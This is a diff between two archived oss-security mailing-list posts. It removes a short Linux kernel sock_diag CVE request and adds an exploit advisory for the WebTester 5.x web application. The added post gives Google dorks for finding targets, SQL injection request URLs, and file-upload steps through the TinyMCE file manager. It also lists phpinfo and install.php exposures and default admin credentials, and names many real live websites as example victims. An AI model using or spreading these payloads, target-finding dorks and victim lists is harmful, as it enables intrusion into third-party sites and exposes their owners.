@@ -1,25 +1,105 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/24/2
-Message-ID: <CA+rthh-9kouDr_Y8BFcE4aOrFsT-78bKQBnweeWf4q-Ph09_2Q@mail.gmail.com>
-Date: Sun, 24 Feb 2013 10:10:45 +0100
-From: Mathias Krause <minipli@...glemail.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request: kernel - sock_diag: Fix out-of-bounds access to sock_diag_handlers[]
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/10/16/1
+Message-ID: <1381887056.76332.YahooMailNeo@web190703.mail.sg3.yahoo.com>
+Date: Wed, 16 Oct 2013 09:30:56 +0800 (SGT)
+From: X-Cisadane <stefanus_dp@...il.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: WebTester 5.x Multiple Vulnerabilities 
 Content-Type: text/plain; charset=utf-8
 
-An unprivileged user can send a netlink message resulting in an
-out-of-bounds access of the sock_diag_handlers[] array which, in turn,
-allows userland to take over control while in kernel mode.
+========================================================================================== 
+WebTester 5.x Multiple Vulnerabilities 
+========================================================================================== 
 
-Patch (already in net/master):
-http://thread.gmane.org/gmane.linux.network/260061
+:--------------------------------------------------------------------------------------------------------------------------
 
-Affected versions:
-v3.3 - v3.8
+--------------: 
+: # Exploit Title : WebTester 5.x Multiple Vulnerabilities  
+: # Date : 15 October 2013 
+: # Author : X-Cisadane 
+: # CMS Developer : http://epplersoft.com/webtester.html 
+: # CMS Source Code : http://sourceforge.net/projects/webtesteronline/ 
+: # Version : ALL 
+: # Category : Web Applications 
+: # Vulnerability : SQL Injection, Arbitrary File Upload, PHPInfo() Disclosure, Leftover install.php File
+: # Tested On : Google Chrome Version 26.0.1410.64 m (Windows XP SP 3 32-Bit English) 
+: # Greetz to : X-Code, Borneo Crew, Depok Cyber, Explore Crew, CodeNesia, Bogor-H, Jakarta Anonymous Club, Jabar Cyber, 
 
-PoC is not attached this time but can be requested on demand. Hint:
-Works well on Fedora 18, bypassing all mmap_min_addr checks. ;)
+Winda Utari 
+:--------------------------------------------------------------------------------------------------------------------------
 
+--------------: 
 
-Thanks,
-Mathias
+DORKS (How to find the target) : 
+================================ 
+intext:Copyright © 2003 - 2010 Eppler Software 
+inurl:/go.php?testID= 
+intitle:WebTester Online Testing 
+Or use your own Google Dorks :) 
+
+Proof of Concept  
+================  
+
+[ 1 ] SQL Injection 
+POC : http://[Site]/[Path]/startTest.php?FirstName=a&LastName=a&TestID=['SQLi] 
+Example : 
+http://simuladodireitocespe.com/startTest.php?FirstName=a&LastName=a&TestID='5 
+http://www.huertos.eu/encuesta/startTest.php?FirstName=a&LastName=a&TestID='5 
+http://autoskola-buratrans.com/templates/default/ispiti/startTest.php?FirstName=a&LastName=a&TestID='5 
+http://conalepnl091.sytes.net/simulador/startTest.php?FirstName=a&LastName=a&TestID='5 
+http://learnin.elschool.pl/startTest.php?FirstName=a&LastName=a&TestID='5 
+...etc... 
+
+[ 2 ] Arbitrary File Upload through TinyMCE (plugins/filemanager)  
+Webster 5.x has a built-in WYSIWYG Editor, that is TinyMCE. The attacker can upload file through the TinyMCE File Manager. 
+It can be found in tiny_mce/plugins/filemanager. 
+
+Poc : http://[Site]/[Path]/tiny_mce/plugins/filemanager/InsertFile/insert_file.php 
+Example the target is http://onlinetests.germaniak.eu/ 
+Change the url to http://onlinetests.germaniak.eu/tiny_mce/plugins/filemanager/InsertFile/insert_file.php 
+Pic #1 : http://i40.tinypic.com/117z390.png 
+Then tick : Insert filetype icon, Insert file size & Insert file modification date. 
+Click upload and wait until the file sent to the server. 
+Pic #2 : http://i39.tinypic.com/2wluaon.png 
+Pic #3 : http://i40.tinypic.com/2uh0fir.png 
+If the file was successfully uploaded, check in the /test-images/ directory. 
+For Example : 
+http://onlinetests.germaniak.eu/test-images/ 
+http://www.rzecznik.org/test/test-images/ 
+http://simula.se/fun/webtester5/test-images/ 
+http://811lifestylecoach.com/test-images/ 
+http://umpire-test.splashprojects.co.uk/test-images/ 
+http://zamoweb.altervista.org/test-images/ 
+...etc... 
+
+[ 3 ] PHPInfo() Disclosure 
+POC : http://[Site]/[Path]/phpinfo.php 
+Example : 
+http://mhsquiz.marbleheadschools.org/webtester/phpinfo.php 
+http://test.auzefiu.com/phpinfo.php 
+http://test.deltaschools.com/phpinfo.php 
+http://www.noordskool.com/toetse/phpinfo.php 
+http://bocahomehealth.com/exam/phpinfo.php 
+...etc... 
+
+[ 4 ] Leftover install.php File 
+POC : http://[Site]/[Path]/install.php
+Example : 
+http://www.ibeucamposmacae.com.br/webtester5/install.php 
+http://briefhealthprograms.com/webtester5/install.php 
+http://intgvna.gardnervna.org/test/install.php 
+http://delarcollege.com/POSTUTME/install.php 
+http://www.orionhs.org/webtester/install.php 
+...etc... 
+
+Bonus : Default Username and Password 
+Username : admin 
+Password : admin 
+Admin Control Panel : http://[Site]/[Path]/admin/
+ 
+Sent from my BlackBerry® smartphone from Sinyal Bagus XL, Nyambung Teruuusss...!
+
+________________________________
+Content of type "text/html" skipped
+
+View attachment "Proof of Concept.txt" of type "text/plain" (3948 bytes)
